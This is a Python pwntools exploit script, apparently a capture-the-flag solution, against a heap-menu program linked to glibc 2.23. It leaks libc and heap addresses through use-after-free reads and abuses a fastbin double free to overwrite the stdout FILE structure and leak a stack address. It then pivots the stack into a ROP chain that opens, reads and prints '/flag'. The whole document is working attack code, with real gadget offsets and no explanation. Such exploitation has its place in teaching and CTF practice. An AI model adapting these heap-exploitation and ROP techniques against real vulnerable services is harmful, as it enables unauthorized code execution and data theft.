from parse_args_and_some_func import *

sh = all_parsed_args['io']
context.update(arch="amd64", os="linux", endian='little')
context.timeout = 2
# sh = process()
if all_parsed_args['debug_enable']:
    libc = all_parsed_args['cur_elf'].libc
else:
    libc = ELF('/root/LibcSearcher/libc-database/other_libc_so/libc-2.23.so')

new_count = -1
def new(size:int, data:(str, bytes), mode=1):
    sh.sendlineafter(">> ", "1")
    if mode:
        sh.sendlineafter("size?\n", str(size))
        sh.sendafter("content?\n", data)
    else:
        sh.sendlineafter("size?", str(size))
        sh.sendafter("content?", data)
    global new_count
    new_count += 1
    return new_count


def delete(idx:int, mode=1):
    sh.sendlineafter(">> ", "2")
    if mode:
        sh.sendlineafter("index ?\n", str(idx))
    else:
        sh.sendlineafter("index ?", str(idx))


def write(idx:int, mode=1):
    sh.sendlineafter(">> ", "3")
    if mode:
        sh.sendlineafter("index ?\n", str(idx))
    else:
        sh.sendlineafter("index ?", str(idx))
    msg = sh.recvline()
    info("msg recv===>{}".format(msg))
    return msg

sh.sendlineafter("what is your name? \n", b"a" * 5 + p64(0x20) * 10)

# leak libc addr
new(0x60, "a") # 0
new(0x200, "a") # 1
new(0x60, "a") # 2
new(0x60, "a") # 3
new(0x60, "a") # 4
delete(1)
msg = write(1) 
leak_libc_addr = u64(msg[:-1].ljust(8, b"\x00"))
LOG_ADDR('leak_libc_addr', leak_libc_addr)

# leak heap addr
delete(2)
delete(0)
msg = write(0) 
leak_heap_addr = u64(msg[:-1].ljust(8, b"\x00"))
LOG_ADDR('leak_heap_addr', leak_heap_addr)
# STOP()
# calc addr
main_arena_offset = 0x3c4b20
libc_base_addr = leak_libc_addr - main_arena_offset - 88
LOG_ADDR("libc_base_addr", libc_base_addr)
# set addr
libc.address = libc_base_addr
environ_addr = libc.sym["__environ"]
stdout_target_addr = libc.sym['_IO_2_1_stdout_'] - 0x43
LOG_ADDR("environ_addr", environ_addr)
LOG_ADDR("stdout_target_addr", stdout_target_addr)

if all_parsed_args['debug_enable']:
    pop_rdi_ret_offset  = 0x21112
    pop_rsi_ret_offset = 0x202f8
    pop_rdx_ret_offset = 0x1b92
    pop_rax_ret_offset = 0x3a738
    pop_rbp_ret_offset = 0x1f930
    pop_rsp_ret_offset = 0x3838
    syscall_ret_offset = 0xbc3f5
else:
    pop_rdi_ret_offset  = 0x21102
    pop_rsi_ret_offset = 0x202e8
    pop_rdx_ret_offset = 0x1b92
    pop_rax_ret_offset = 0x33544
    pop_rbp_ret_offset = 0x1f930
    pop_rsp_ret_offset = 0x3838
    syscall_ret_offset = 0xbc375
pop_rdi_ret = libc.offset_to_vaddr(pop_rdi_ret_offset)
pop_rsi_ret = libc.offset_to_vaddr(pop_rsi_ret_offset)
pop_rdx_ret = libc.offset_to_vaddr(pop_rdx_ret_offset)
pop_rax_ret = libc.offset_to_vaddr(pop_rax_ret_offset)
pop_rbp_ret = libc.offset_to_vaddr(pop_rbp_ret_offset)
pop_rsp_ret = libc.offset_to_vaddr(pop_rsp_ret_offset)
syscall_ret = libc.offset_to_vaddr(syscall_ret_offset)
# pop_rdi_ret = libc.offset_to_vaddr(pop_rdi_ret_offset)
use_heap_addr = leak_heap_addr - 0x200

layout = ["/flag\x00\x00\x00" * 2, pop_rdi_ret, -1, pop_rsi_ret, use_heap_addr, pop_rdx_ret, 0, pop_rax_ret, 257, syscall_ret,
            pop_rdi_ret, 3, pop_rsi_ret, use_heap_addr + 0x150, pop_rdx_ret, 0x30, pop_rax_ret, 0, syscall_ret,
            pop_rdi_ret, 1, pop_rsi_ret, use_heap_addr + 0x150, pop_rdx_ret, 0x30, pop_rax_ret, 1, syscall_ret]
new(0x200, flat(layout))

# fast bin attack
delete(2)
new(0x60, p64(stdout_target_addr)) # 5
new(0x60, "a") # 6
new(0x60, p64(stdout_target_addr)) # 7
# STOP()
layout = ["\x00" * 0x33, 0xfbad1800, p64(libc.sym["_IO_2_1_stdout_"]+131) * 3, environ_addr, environ_addr+0x10]
new(0x68, flat(layout))
msg = sh.recvn(8)
leak_stack_addr = u64(msg)
LOG_ADDR("leak_stack_addr", leak_stack_addr)

s_addr = leak_stack_addr - 0x208

target_addr = leak_stack_addr - 0x253 - 0x10


delete(3, 0)
delete(4, 0)
delete(3, 0)
LOG_ADDR('target_addr', target_addr)
LOG_ADDR('s_addr', s_addr)


layout = ["b" * 19, pop_rbp_ret, use_heap_addr + 0x200, pop_rsp_ret, use_heap_addr + 0x10]
new(0x60, p64(target_addr), 0)
new(0x60, p64(target_addr), 0)
new(0x60, p64(target_addr), 0)
# STOP()
new(0x60,  flat(layout), 0)



sh.interactive()